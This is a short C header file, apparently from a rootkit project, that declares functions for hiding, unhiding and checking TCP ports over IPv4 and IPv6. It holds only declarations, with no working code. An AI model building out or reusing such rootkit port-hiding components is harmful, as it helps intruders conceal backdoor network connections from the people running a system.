#ifndef ROOTKIT_HIDDEN_TCP_PORTS_H
#define ROOTKIT_HIDDEN_TCP_PORTS_H

#define NO_PORTS 65536

void add_hidden_tcp4_port(int port);
void remove_hidden_tcp4_port(int port);

int is_tcp4_port_hidden(int port);

void add_hidden_tcp6_port(int port);
void remove_hidden_tcp6_port(int port);

int is_tcp6_port_hidden(int port);

#endif //ROOTKIT_HIDDEN_TCP_PORTS_H
